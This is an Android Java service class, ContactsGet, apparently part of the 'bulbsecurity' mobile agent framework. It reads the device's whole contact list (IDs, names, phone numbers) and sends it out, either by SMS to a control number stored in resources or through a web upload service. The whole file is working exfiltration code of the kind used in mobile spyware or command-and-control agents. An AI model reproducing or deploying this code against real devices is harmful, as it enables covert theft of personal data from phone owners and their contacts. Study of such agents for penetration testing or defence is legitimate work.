package com.bulbsecurity.framework;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.Contacts.People;

public class ContactsGet extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		String ret = intent.getStringExtra("returnmethod");
		String sms = "SMS";
		String web = "WEB";
		String allcontacts = "Contacts:";
		Cursor cur = getContentResolver().query(People.CONTENT_URI, null, null, null, null);
		if (cur.getCount() > 0) {
		     while (cur.moveToNext()) {
		    	 String thiscontact = null;
		         String id = cur.getString(cur.getColumnIndex(People._ID));
		         String name = cur.getString(cur.getColumnIndex(People.DISPLAY_NAME));
		         String number = cur.getString(cur.getColumnIndex(People.NUMBER));
		         if (number != null)
		         {
		         thiscontact = id.concat(" ");
		         thiscontact = thiscontact.concat(name);
		         thiscontact = thiscontact.concat(" ");
		         thiscontact = thiscontact.concat(number);
		         thiscontact = thiscontact.concat("; ");
		         allcontacts = allcontacts.concat(thiscontact);
		         }
		        
		         
		     }
		     
		}
		if (ret != null)
		{
			if (ret.equals(sms))
			{

				Intent intent3 = new Intent(getApplicationContext(), SMSService.class);
				//String number2 = ((AndroidAgent)this.getApplication()).getcontrolNumber();
				//String key = ((AndroidAgent)this.getApplication()).getkey();
				String key = getApplicationContext().getResources().getString(R.string.key);
				String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
				String first = key.concat(" ");
				String allcontactss = first.concat(allcontacts);
				intent3.putExtra("number", number2);
				intent3.putExtra("message", allcontactss);
				Context context = getApplicationContext();
				context.startService(intent3);
				
			}
			else if (ret.equals(web))
			{
				Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
				intent2.putExtra("uploadstring", allcontacts);
				Context context = getApplicationContext();
				context.startService(intent2);
			}

		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
